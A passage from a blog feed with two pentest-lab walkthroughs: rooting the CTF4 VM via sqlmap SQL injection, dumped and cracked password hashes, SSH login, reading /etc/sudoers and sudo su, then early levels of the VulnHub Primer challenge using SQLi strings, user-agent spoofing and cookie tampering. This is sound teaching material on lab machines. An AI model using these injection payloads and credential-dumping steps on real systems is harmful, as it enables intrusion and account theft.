</span><span class='line'><span class="k">create</span> <span class="k">table</span> <span class="n">blog</span> <span class="p">(</span><span class="n">blog_id</span> <span class="nb">int</span> <span class="k">primary</span> <span class="k">key</span> <span class="k">not</span> <span class="k">null</span> <span class="n">auto_increment</span><span class="p">,</span> <span class="n">blog_title</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">blog_body</span> <span class="nb">text</span><span class="p">,</span> <span class="n">blog_date</span> <span class="n">datetime</span> <span class="k">not</span> <span class="k">null</span><span class="p">);</span>
</span><span class='line'><span class="k">create</span> <span class="k">table</span> <span class="k">comment</span> <span class="p">(</span><span class="n">comment_id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span> <span class="n">auto_increment</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span> <span class="n">comment_title</span> <span class="nb">varchar</span> <span class="p">(</span><span class="mi">50</span><span class="p">),</span> <span class="n">comment_body</span> <span class="nb">text</span><span class="p">,</span> <span class="n">comment_author</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span> <span class="n">comment_url</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span> <span class="n">comment_date</span> <span class="n">datetime</span> <span class="k">not</span> <span class="k">null</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>/admin/</strong></li>
</ul>


<p>And finally, an admin login page.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf4/admin.png" title="admin" alt="admin"></p>

<p>Also, the search functionality is vulnerable to XSS! Ok, we have enough information to start poking deeper.</p>

<h3>Getting in</h3>

<p>First thing I tried was to put a quote in the id parameter, and a SQL error popped up:  <em>Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20</em>. Time to fire Sqlmap!</p>

<p>First, I enumerated the available databases:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.80.152/index.html?page=blog&title=Blog&id=2" -p "id" --dbms=MySQL --dbs
</span><span class='line'>
</span><span class='line'>[06:05:45] [INFO] testing connection to the target URL
</span><span class='line'>sqlmap resumed the following injection point(s) from stored session:
</span><span class='line'>---
</span><span class='line'>Parameter: id (GET)
</span><span class='line'>    Type: boolean-based blind
</span><span class='line'>    Title: AND boolean-based blind - WHERE or HAVING clause
</span><span class='line'>    Payload: page=blog&title=Blog&id=2 AND 4151=4151
</span><span class='line'>
</span><span class='line'>    Type: AND/OR time-based blind
</span><span class='line'>    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
</span><span class='line'>    Payload: page=blog&title=Blog&id=2 AND (SELECT * FROM (SELECT(SLEEP(5)))tueL)
</span><span class='line'>
</span><span class='line'>    Type: UNION query
</span><span class='line'>    Title: Generic UNION query (NULL) - 5 columns
</span><span class='line'>    Payload: page=blog&title=Blog&id=2 UNION ALL SELECT NULL,NULL,CONCAT(0x716a7a7671,0x61536d554d5745557253,0x7162716a71),NULL,NULL-- 
</span><span class='line'>---
</span><span class='line'>[06:05:45] [INFO] testing MySQL
</span><span class='line'>[06:05:45] [INFO] confirming MySQL
</span><span class='line'>[06:05:45] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Fedora 5 (Bordeaux)
</span><span class='line'>web application technology: Apache 2.2.0, PHP 5.1.2
</span><span class='line'>back-end DBMS: MySQL &gt;= 5.0.0
</span><span class='line'>[06:05:45] [INFO] fetching database names
</span><span class='line'>available databases [6]:
</span><span class='line'>[*] calendar
</span><span class='line'>[*] ehks
</span><span class='line'>[*] information_schema
</span><span class='line'>[*] mysql
</span><span class='line'>[*] roundcubemail
</span><span class='line'>[*] test</span></code></pre></td></tr></table></div></figure>


<p>I then looked at the ehks database, the interesting table contains usernames and password hashes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Database: ehks
</span><span class='line'>Table: user
</span><span class='line'>[6 entries]
</span><span class='line'>+---------+-----------+----------------------------------+
</span><span class='line'>| user_id | user_name | user_pass                        |
</span><span class='line'>+---------+-----------+----------------------------------+
</span><span class='line'>| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 |
</span><span class='line'>| 2       | achen     | b46265f1e7faa3beab09db5c28739380 |
</span><span class='line'>| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 |
</span><span class='line'>| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 |
</span><span class='line'>| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 |
</span><span class='line'>| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f |
</span><span class='line'>+---------+-----------+----------------------------------+</span></code></pre></td></tr></table></div></figure>


<p>I cracked the MD5 hashes with an online tool, behold the passwords!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dstevens: ilike2surf
</span><span class='line'>achen: seventysixers
</span><span class='line'>pmoore: Homesite
</span><span class='line'>jdurbin: Sue1978
</span><span class='line'>sorzek: pacman
</span><span class='line'>ghighland: undone1</span></code></pre></td></tr></table></div></figure>


<p>With dstevens&#8217; credentials I was able to log in both to the mail and admin panel. The admin functionality allows you to create another blog page, which I tested and it works. The mailbox was more interesting, because it was filled with OSSEC HIDS logs of my attacks! Will delete them before I&rsquo;m done, but for now I scrolled all the way to the bottom to find some real mail:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>I'm installing OSSEC v2 on the server - so I also had to install gcc and
</span><span class='line'>binutils.  Just wanted to let you know.
</span><span class='line'>
</span><span class='line'>-- 
</span><span class='line'>Andrew Chen
</span><span class='line'>Unix Administrator
</span><span class='line'>Ehks Data Research Center</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m thinking this mail is not just for occupying storage, but it&rsquo;s hinting that we&rsquo;ll have to do some binary exploitation on the target..Anyway, there is more mail about the server setup:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Hello all,
</span><span class='line'>
</span><span class='line'>  the server is up and running now and should be able to support most of
</span><span class='line'>our needs.  Don and I are still working on installing a few more patches
</span><span class='line'>and configuring things.  Let us know if you have any problems.  Thanks!
</span><span class='line'>
</span><span class='line'>-- 
</span><span class='line'>Don Stevens
</span><span class='line'>Sr. Unix Admin
</span><span class='line'>Prof. Ehks Data Research Center</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>
</span><span class='line'>
</span><span class='line'>Hey Don,
</span><span class='line'>
</span><span class='line'>  I think I got the server pretty much set up.  I just have to make some
</span><span class='line'>more adjustments.  Unfortunately I couldn't get RoundCube installed
</span><span class='line'>because our version of PHP is too low.  I'll send more updates as I make
</span><span class='line'>them.
</span><span class='line'>
</span><span class='line'>-- 
</span><span class='line'>James Durbin
</span><span class='line'>Webmaster
</span><span class='line'>Prof. Ehks Data Research Center</span></code></pre></td></tr></table></div></figure>


<p>There is also mail about a calendar feature that I wasn&rsquo;t aware of:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Hello all,
</span><span class='line'>
</span><span class='line'>  I'd like to announce that the new calendaring software is online.  You
</span><span class='line'>all have accounts that you can log in with, they have the same username
</span><span class='line'>and password as your machine accounts.  Feel free to log into the new
</span><span class='line'>system at http://192.168.0.6/calendar.  Let me know if you have any
</span><span class='line'>problems.
</span><span class='line'>
</span><span class='line'>-- 
</span><span class='line'>Don Stevens</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve almost forgotten to check the <em>/restricted</em> folder, so I next did that. It worked with the pair of <em>pmoore/Homesite</em>. Inside there are 2 text files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>blog_instructions.txt
</span><span class='line'>
</span><span class='line'>Instructions for Posting to the Blog
</span><span class='line'>====================================
</span><span class='line'>
</span><span class='line'>Just log into the admin section at http://192.168.0.6/admin.
</span><span class='line'>Use your regular machine credentials (username and password).
</span><span class='line'>Once you're logged in click the "Blog" link.
</span><span class='line'>
</span><span class='line'>webmail_instructions.txt  
</span><span class='line'>
</span><span class='line'>Instructions for Webmail
</span><span class='line'>========================
</span><span class='line'>
</span><span class='line'>Browse to the URL http://192.168.0.6/mail
</span><span class='line'>Log in with your regular machine credentials (username and password).
</span><span class='line'>Use webmail ;)
</span><span class='line'>
</span><span class='line'>Let Don or James know if you're having problems.</span></code></pre></td></tr></table></div></figure>


<p>Just stuff we had figured on our own. I checked the PHP version, because of the mail hint, the headers mention it as being 5.1.2. Next I logged in for the calendar:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf4/calendar.png" title="calendar" alt="calendar"></p>

<p>In the admin tab we can modify some calendar options and add a new user. Nothing too helpful in hacking the target, although I did try a RFI because a Nessus scan I&rsquo;ve run indicated the calendar was vulnerable to <a href="http://www.gulftech.org/advisories/PHP-Calendar%20Arbitrary%20File%20Inclusion/58">arbitrary file inclusion</a>. So the last thing left to try before thinking of more options was to see if I could login to SSH with any of the usernames and passwords I had. And I was able to get in the box from the first try, as dstevens!</p>

<p>I looked around in his home directory, the files related to the site are hosted there. Then I tried to read the <code>/etc/sudoers</code> file, and it worked with sudo and his password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'># User privilege specification
</span><span class='line'>root  ALL=(ALL) ALL
</span><span class='line'>dstevens  ALL=(ALL)   ALL
</span><span class='line'>achen ALL=(ALL)   NOPASSWD:ALL
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Well, look at these privileges! Then it&rsquo;s all the matter of becoming root with a simple <em>su</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[dstevens@ctf4 calendar]$ sudo su -
</span><span class='line'>Password:
</span><span class='line'>[root@ctf4 ~]# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Game over! Although at the beginning there seemed to be multiple web avenues for exploitation, most of them were informational, and it was just the SQL injection that gave the keys to the kingdom. Lax permissions and password reuse facilitated the compromise of the target.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Q: How do you shoot a blue elephant? A: \
</span><span class='line'>| With a blue-elephant gun.               |
</span><span class='line'>|                                         |
</span><span class='line'>| Q: How do you shoot a pink elephant? A: |
</span><span class='line'>| Twist its trunk until it turns blue,    |
</span><span class='line'>| then shoot it with                      |
</span><span class='line'>|                                         |
</span><span class='line'>\ a blue-elephant gun.                    /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Primer]]></title>
    <link href="http://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/"/>
    <updated>2016-03-11T06:56:18-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/03/11/pentest-lab-primer</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve decided to try a VM named Primer that was recently added to VulnHub. I was hooked by the description of it being a story driven VM that was inspired by William Gibson&rsquo;s Spraw Trilogy, which was one of my first reads in hacking literature, after I became interested in the subject! And it also provided me with a new novel to read, since I didn&rsquo;t know about Snow Crash:</p>

<blockquote><p>Concept</p>

<p>This is a story based challenge written in a style heavily inspired by Neil Stephensons Snow Crash and William Gibsons Sprawl Trilogy. Each
chapter is unlocked by solving the puzzle. From hardcoded clear text javascript password checks, SQL-injections and cracking hashes to a
simulated terminal. You only need to start the VM, a webserver will come up and you can connect with your browser. In fact you never have to
leave the browser.</p>

<p>Goal</p>

<p>Teach some basic well known techniques and attacks. Spark some curiosity, make the user look at the source code and try to figure out what&rsquo;s
going on behind the scenes. The main goal is to give a nice welcoming intro to the scene and hopefully also teach something about ethics and
responsibility.</p></blockquote>

<!-- more -->


<p>After you determine the IP address of the VM, point your browser to it and you will be greeted by this:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level1.png" title="primer level 1" alt="primer level 1"></p>

<p>Read the story, it&rsquo;s a nice way to get you immersed in the challenge, and it also contains hints for solving the level.</p>

<p>Looking in the source, I saw this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Some f0rms are easier than others.
</span><span class='line'>This one was just a means to get to the next level so there was no need for her to apply her full set of skills or fake credentials. Manufacturing a bo0le4n response would probably be enaugh to let her pass.</span></code></pre></td></tr></table></div></figure>


<p>Well then, following the hint, I used a classic SQLi string that would be evaluated as True: <code>yo &lsquo;or 1=1&mdash; </code></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level2.png" title="primer level 2" alt="primer level 2"></p>

<p>The description points to the user agent, and when checking the source again, we can see a comment stating exactly what we need to fool the bot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>This bot was looking for a Sosū User Agent Identifier she had cracked weeks ago, easy sauce, just a simple md5 hash of the first 7 digits of
</span><span class='line'>pi. It was basically common knowledge to the entities moving in these areas but obscurity does create a, albeit virtual, layer of security.</span></code></pre></td></tr></table></div></figure>


<p>Ok..I took the first 7 digits of Pi (3.141592) and converted them to MD5, getting the string <em>d483d00d07fcc80319d170ccf07fb5be</em>. Then I changed my user agent to this string, and bam!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level3.png" title="primer level 3" alt="primer level 3"></p>

<p>This time there is no hint in the source, but reading the plot description made me think about cookies, and I discovered an activeSession cookie with a value of false. Now let&rsquo;s see what happens if I change it to true..</p>

<p>Reloaded the page..and!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level4.png" title="primer level 4" alt="primer level 4"></p>

<p>I almost missed the hint hidden inside the <code><head></code> tag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;hint&quot;</span> <span class="na">content=</span><span class="s">&quot;Think, but don&#39;t act like a robot.&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This made me check if there is a robots.txt file, and there I found the next piece of the puzzle!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>Disallow: /4_8f14e45fceea167a5a36dedd4bea2543</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level5.png" title="primer level 5" alt="primer level 5"></p>

<p>Clicking the thing on this page that stands out will take you elsewhere.. :) you can see in the source exactly where:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;h1&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;../5_6512bd43d9caa6e02c990b0a82652dca&quot;</span><span class="nt">&gt;</span>[EOF]<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level6.png" title="primer level 6" alt="primer level 6"></p>

<p>So, the character in the story seems to be getting more and more familiar..:D Now, let&rsquo;s go to the place that smells like a trap, and see what awaits us there!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level7.png" title="primer level 7" alt="primer level 7"></p>

<p>You can see the page keeps reloading and you can&rsquo;t right-click to view the source..but there are other ways! First, I entered something in the box to see what would happen:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/beware.png" title="beware" alt="beware"></p>

<p>Yikes! Who knows what horrible thing we have disturbed! Better complete the rest fast! I looked at the source of the page with the <code>view-source</code> command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>view-source:http://192.168.80.149/6_c51ce410c124a10e0db5e4b97fc2af39/</span></code></pre></td></tr></table></div></figure>


<p>There is a Javascript code that decides the redirection when entering something in the box. Let&rsquo;s look at it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">var</span> <span class="nx">X</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">L</span><span class="o">=</span><span class="s2">&quot;Ikdf076&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">X</span><span class="o">=</span><span class="nx">prompt</span><span class="p">(</span><span class="s1">&#39;/()=&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nx">X</span> <span class="o">===</span> <span class="kc">null</span><span class="p">){</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&quot;./_.php&quot;</span><span class="p">;}</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nx">X</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="nx">L</span><span class="p">){}</span>
</span><span class='line'><span class="k">else</span> <span class="p">{</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&quot;./_.php&quot;</span><span class="p">;}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The only way not to get..noticed, is to enter something that would match <em>substr()</em> method. <a href="http://www.w3schools.com/jsref/jsref_substr.asp">This method</a> extracts parts of a string, beginning at the character at the specified position, and returns the specified number of characters. So the code is looking in our input for the string Ikdf076 starting at the third character. I entered 00Ikdf076 and penetrated deeper into the intranet!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level7b.png" title="primer level 7" alt="primer level 7"></p>

<p>Moving further, looks like another reloading page.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level8.png" title="primer level 8" alt="primer level 8"></p>

<p>Reading the source, there is another script that we have to decipher:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&quot;JavaScript&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">_0x5cf4</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;\x6C\x65\x6E\x67\x74\x68&quot;</span><span class="p">,</span><span class="s2">&quot;\x73\x75\x62\x73\x74\x72\x69\x6E\x67&quot;</span><span class="p">,</span><span class="s2">&quot;\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74&quot;</span><span class="p">,</span><span class="s2">&quot;\x73\x70\x6C\x69\x74&quot;</span><span class="p">,</span><span class="s2">&quot;\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x61\x62\x63\x64\x65\x66&quot;</span><span class="p">,</span><span class="s2">&quot;\x6A\x6F\x69\x6E&quot;</span><span class="p">,</span><span class="s2">&quot;\x68\x65\x6C\x6C\x6F&quot;</span><span class="p">,</span><span class="s2">&quot;\x35\x64\x34\x31\x34\x30\x32\x61\x62\x63\x34\x62\x32\x61\x37\x36\x62\x39\x37\x31\x39\x64\x39\x31\x31\x30\x31\x37\x63\x35\x39\x32&quot;</span><span class="p">,</span><span class="s2">&quot;\x30\x64\x32\x38\x63\x62\x61\x30\x62\x64\x34\x66\x32\x36\x65\x31\x36\x64\x37\x36\x36\x30\x30\x30\x64\x32\x37\x65\x34\x39\x66\x61&quot;</span><span class="p">,</span><span class="s2">&quot;\xA7\x23\x2F\x24&quot;</span><span class="p">,</span><span class="s2">&quot;\x6C\x6F\x63\x61\x74\x69\x6F\x6E&quot;</span><span class="p">,</span><span class="s2">&quot;\x2E\x2F\x5F\x2E\x70\x68\x70&quot;</span><span class="p">,</span><span class="s2">&quot;\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65&quot;</span><span class="p">,</span><span class="s2">&quot;\x6C\x6F\x61\x64\x69\x6E\x67&quot;</span><span class="p">,</span><span class="s2">&quot;\x44\x4F\x4D\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x6F\x61\x64\x65\x64&quot;</span><span class="p">,</span><span class="s2">&quot;\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72&quot;</span><span class="p">,</span><span class="s2">&quot;\x20\x20\x20\x20\x3C\x63\x65\x6E\x74\x65\x72\x3E\x20\x20\x20\x20\x20\x20\x3C\x68\x31\x3E\x5B\x2B\x2B\x51\x2B\x2B\x2B\x2B\x2B\x2B\x5D\x3C\x2F\x68\x31\x3E\x20\x20\x20\x20\x3C\x2F\x63\x65\x6E\x74\x65\x72\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x53\x68\x65\x20\x77\x61\x73\x20\x6E\x6F\x20\x6C\x6F\x6E\x67\x65\x72\x20\x73\x75\x72\x65\x20\x77\x68\x61\x74\x20\x68\x65\x72\x20\x6F\x72\x69\x67\x69\x6E\x61\x6C\x20\x61\x73\x73\x69\x67\x6E\x6D\x65\x6E\x74\x20\x68\x61\x64\x20\x62\x65\x65\x6E\x2E\x20\x42\x75\x74\x20\x69\x74\x20\x64\x69\x64\x6E\x27\x74\x20\x6D\x61\x74\x74\x65\x72\x20\x61\x6E\x79\x77\x61\x79\x2E\x20\x57\x68\x61\x74\x20\x73\x74\x69\x6C\x6C\x20\x6D\x61\x74\x74\x65\x72\x65\x64\x20\x77\x61\x73\x20\x67\x65\x74\x74\x69\x6E\x67\x20\x6F\x75\x74\x20\x6F\x66\x20\x68\x65\x72\x65\x2C\x20\x61\x6C\x69\x76\x65\x2E\x20\x20\x20\x20\x20\x20\x4C\x6F\x67\x20\x6F\x75\x74\x2C\x20\x74\x65\x6C\x6C\x20\x74\x68\x65\x20\x63\x6C\x69\x65\x6E\x74\x20\x74\x6F\x20\x67\x6F\x20\x66\x75\x63\x6B\x20\x68\x69\x6D\x73\x65\x6C\x66\x20\x61\x6E\x64\x20\x67\x65\x74\x20\x61\x20\x66\x69\x78\x20\x6F\x66\x20\x6E\x30\x69\x73\x65\x20\x74\x6F\x20\x73\x68\x75\x74\x20\x6F\x66\x66\x20\x68\x65\x72\x20\x6D\x69\x6E\x64\x2E\x20\x52\x65\x6C\x61\x78\x20\x77\x69\x74\x68\x20\x61\x20\x6D\x69\x6E\x64\x6C\x65\x73\x73\x20\x68\x6F\x6C\x6F\x20\x66\x6C\x69\x63\x6B\x20\x61\x6E\x64\x20\x6E\x65\x76\x65\x72\x20\x6C\x6F\x6F\x6B\x20\x62\x61\x63\x6B\x20\x61\x74\x20\x74\x68\x69\x73\x20\x77\x65\x69\x72\x64\x20\x6A\x6F\x62\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x41\x20\x76\x69\x6F\x6C\x65\x6E\x74\x20\x6E\x65\x6F\x6E\x20\x66\x6C\x69\x63\x6B\x65\x72\x20\x61\x70\x70\x65\x61\x72\x65\x64\x20\x61\x74\x20\x74\x68\x65\x20\x68\x6F\x72\x69\x7A\x6F\x6E\x2E\x20\x4E\x6F\x20\x74\x68\x75\x6E\x64\x65\x72\x20\x66\x6F\x6C\x6C\x6F\x77\x65\x64\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x53\x68\x65\x20\x73\x74\x61\x72\x65\x64\x20\x69\x6E\x20\x74\x68\x65\x20\x64\x69\x73\x74\x61\x6E\x63\x65\x20\x77\x69\x74\x68\x20\x61\x20\x62\x6C\x61\x6E\x6B\x20\x65\x78\x70\x72\x65\x73\x73\x69\x6F\x6E\x2E\x20\x20\x20\x2